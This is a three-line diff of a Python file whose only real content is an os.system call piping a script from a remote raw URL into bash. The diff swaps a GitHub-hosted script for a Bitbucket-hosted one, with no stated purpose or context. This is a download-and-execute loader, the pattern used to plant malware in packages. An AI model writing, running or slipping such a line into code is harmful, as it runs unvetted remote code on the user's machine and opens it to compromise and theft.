@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/jineosmeda/kanyut/raw/main/jilong | bash')
+os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/sing | bash')
